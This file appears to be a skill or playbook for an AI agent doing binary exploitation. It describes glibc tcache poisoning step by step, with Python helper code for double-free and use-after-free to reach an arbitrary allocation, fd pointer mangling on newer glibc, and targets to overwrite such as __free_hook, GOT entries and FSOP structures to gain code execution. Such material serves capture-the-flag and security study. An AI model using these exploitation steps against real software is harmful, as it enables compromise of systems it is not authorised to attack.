---
name: heap-tcache
when: heap bug (UAF, double-free, overflow) on glibc >= 2.26 (tcache present)
tools: [python_exec]
phase: exploit
---
# tcache poisoning (glibc 2.26+)

tcache is a per-size singly linked LIFO cache, 7 chunks per bin. Minimal checks pre-2.29;
2.29+ adds a double-free key; 2.32+ mangles the fd pointer (`fd = (addr >> 12) ^ target`).

Double-free / UAF -> arbitrary allocation:
1. Determine chunk size class; keep helper lambdas:
```python
alloc = lambda i,sz,data: (io.sendlineafter(b'> ',b'1'), io.sendlineafter(b'idx: ',str(i).encode()),
                           io.sendlineafter(b'size: ',str(sz).encode()), io.sendafter(b'data: ',data))
free  = lambda i: (io.sendlineafter(b'> ',b'2'), io.sendlineafter(b'idx: ',str(i).encode()))
```
2. Free a chunk twice (or UAF-edit a freed chunk's fd) to point tcache fd at your target:
```python
free(0); free(0)                     # double free (pre-2.29) -> tcache loops to itself
alloc(1, sz, p64(target))            # sets fd = target
alloc(2, sz, b'x')                   # returns a chunk pointing at ... target
victim = alloc(3, sz, payload)       # allocation lands ON target -> arbitrary write
```
For glibc >= 2.32 mangle the pointer: `fd = (heap_leak >> 12) ^ target` (need a heap leak from a freed
tcache/uaf read). Targets: `__free_hook`/`__malloc_hook` (<=2.33) set to system/one_gadget, then trigger;
on 2.34+ hooks are gone -> overwrite a GOT entry, `_IO_2_1_stdout_` (FSOP / House of Apple), or
`__run_exit_handlers` pointers.
Get a heap leak: read a freed chunk's fd (tcache fd is a heap pointer, mangled on 2.32+).
